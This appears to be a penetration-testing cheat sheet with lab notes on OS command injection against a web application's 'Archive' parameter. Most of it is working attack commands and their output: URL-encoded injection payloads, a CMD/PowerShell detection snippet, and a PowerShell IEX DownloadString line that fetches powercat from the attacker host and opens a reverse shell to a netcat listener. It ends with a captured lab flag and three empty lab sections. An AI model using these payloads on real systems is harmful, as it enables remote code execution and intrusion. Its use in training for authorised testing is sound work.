# OS Command Injection

Modified Web Content and new Input Textbox
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-23.png)

Clone command for the ExploitDB repository
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-24.png)

Successfully cloned the ExploitDB Repository via the Web Application
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-25.png)

Archive Parameter in the POST request
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/OS-Command-Injection-26.png)

Detected Command Injection for ipconfig
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
># =====================================
>```

Entering git as command
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
>           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
>           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
>...
>   push      Update remote refs along with associated objects
>
>'git help -a' and 'git help -g' list available subcommands and some
>concept guides. See 'git help <command>' or 'git help <concept>'
>to read about a specific subcommand or concept.
>See 'git help git' for an overview of the system.
># =====================================
>```

Using git version to detect the operating system
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>Repository successfully cloned with command: git version and output: git version 2.35.1.windows.2
># =====================================
>```

Entering git and ipconfig with encoded semicolon
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>...
>'git help -a' and 'git help -g' list available subcommands and some
>concept guides. See 'git help <command>' or 'git help <concept>'
>to read about a specific subcommand or concept.
>See 'git help git' for an overview of the system.
>
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0 2:
>
>   Connection-specific DNS Suffix  . : 
>   IPv4 Address. . . . . . . . . . . : 192.168.50.189
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.50.254
># =====================================
>```

Code Snippet to check where our code is executed
>``` shell
>(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
>```

Determining where the injected commands are executed
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
>
># ========== Expected Result ==========
>...
>See 'git help git' for an overview of the system.
>PowerShell
># =====================================
>```

Serve Powercat via Python3 web server
>``` shell
>kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
>
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
># =====================================
>```

Starting Netcat listener on port 4444
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>```

Command to download PowerCat and execute a reverse shell
>``` shell
>IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
>```

Downloading Powercat and creating a reverse shell via Command Injection
>``` shell
>kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
>```

Python3 web server shows GET request for powercat.ps1
>``` shell
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
>192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
># =====================================
>```

Successfull reverse shell connection via Command Injection
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
>connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
>Windows PowerShell 
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>PS C:\Users\Administrator\Documents\meteor>
># =====================================
>```

Lab 1 - Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.
>``` shell
># Verify Command Injection Works
>kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.118.189:8000/archive
>
># ========== Expected Result ==========
>...
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0:
>
>   Connection-specific DNS Suffix  . : 
>   IPv4 Address. . . . . . . . . . . : 192.168.118.189
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.118.254
>
># =====================================
>
># Download Powercat script
>kali@kali:~$ wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
>
># ========== Expected Result ==========
>--2025-11-18 11:00:54--  https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
>Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
>HTTP request sent, awaiting response... 200 OK
>Length: 37667 (37K) [text/plain]
>Saving to: ‘powercat.ps1.2’
>
>powercat.ps1.2         100%[============================>]  36.78K  --.-KB/s    in 0.008s  
>
>2025-11-18 11:00:54 (4.73 MB/s) - ‘powercat.ps1.2’ saved [37667/37667]
># =====================================
>
># Start a Python Web Server
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
># =====================================
>
># Start Netcat Listener
>nc -lvnp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>
># Exploit the Web App With Payload (Target: 192.168.118.189, Kali IP: 192.168.45.203)
>curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.203%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.203%20-p%204444%20-e%20powershell' http://192.168.118.189:8000/archive
>
># ========== Expected Result ==========
>connect to [192.168.45.203] from (UNKNOWN) [192.168.118.189] 59393
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
>
>
>PS C:\Users\Administrator\Documents\meteor>
># =====================================
>
>
>PS C:\Users\Administrator\Documents\meteor> cd C:\Users\Administrator\Desktop
>
>PS C:\Users\Administrator\Desktop> dir
>
># ========== Expected Result ==========
>dir
>
>
>    Directory: C:\Users\Administrator\Desktop
>
>
>Mode                 LastWriteTime         Length Name                                                                 
>----                 -------------         ------ ----                                                                 
>-a----        11/18/2025   8:40 AM             38 secrets.txt
># =====================================
>
>PS C:\Users\Administrator\Desktop> type secrets.txt
>
># ========== Expected Result ==========
>type secrets.txt
>OS{ceb86d2cd9259de098bd192693fe0e16}
># =====================================
>```
>OS{ceb86d2cd9259de098bd192693fe0e16}

Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
>``` shell
>
>```
>

Lab 3 - Capstone Lab: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.
>``` shell
>
>```
>

Lab 4 - Capstone Lab: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in C:\inetpub\.
>``` shell
>
>```
>
